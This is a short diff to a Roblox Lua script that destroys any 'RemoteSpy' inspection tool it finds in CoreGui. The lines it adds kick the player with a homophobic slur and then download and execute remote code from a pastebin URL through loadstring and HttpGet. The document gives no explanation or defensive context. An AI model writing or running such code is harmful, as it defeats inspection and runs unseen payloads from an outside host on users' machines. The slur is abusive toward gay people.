@@ -1,7 +1,10 @@
-while true do
+while wait(1) do
 for i,v in pairs(game:GetService("CoreGui"):GetDescendants()) do
 if v.Name == "RemoteSpy" then
 v:Destroy()
+wait(.5)
+game.Players.LocalPlayer:Kick("Bro Fr Gay")
+loadstring(game:HttpGet("https://pastebin.com/raw/kdgLtD8Y"))()
 end
 end
 wait()
